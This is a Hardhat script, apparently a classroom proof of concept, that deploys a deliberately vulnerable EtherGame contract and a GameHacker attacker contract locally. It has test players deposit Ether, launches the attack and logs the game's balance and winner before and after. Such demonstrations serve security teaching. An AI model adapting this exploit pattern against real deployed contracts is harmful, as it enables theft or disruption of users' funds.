const { ethers } = require("hardhat");

async function main() {
  // Deploy the EtherGame contract
  const EtherGame = await ethers.getContractFactory("EtherGame");
  const etherGame = await EtherGame.deploy();
  await etherGame.waitForDeployment();

  // Deploy the GameHacker contract
  const GameHacker = await ethers.getContractFactory("GameHacker");
  const gameHacker = await GameHacker.deploy();
  await gameHacker.waitForDeployment();

  // Get player accounts
  const [deployer, player1, player2] = await ethers.getSigners();

  // Players deposit Ether into EtherGame
  console.log("Starting game deposits...");
  await etherGame.connect(player1).deposit({ value: ethers.parseEther("1") });
  console.log("Player1 deposited 1 Ether");

  await etherGame.connect(player2).deposit({ value: ethers.parseEther("1") });
  console.log("Player2 deposited 1 Ether");

  console.log(
    "EtherGame balance before attack:",
    ethers.formatEther(await etherGame.getBalance())
  );
  // Exploit using GameHacker
  console.log("Launching the attack...");
  await gameHacker.connect(deployer).Attack(etherGame, { value: ethers.parseEther("10") });

  console.log(
    "EtherGame balance after attack:",
    ethers.formatEther(await etherGame.getBalance())
  );
  const winnerAfterAttack = await etherGame.winner();
  console.log("Game winner after attack:", winnerAfterAttack);
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
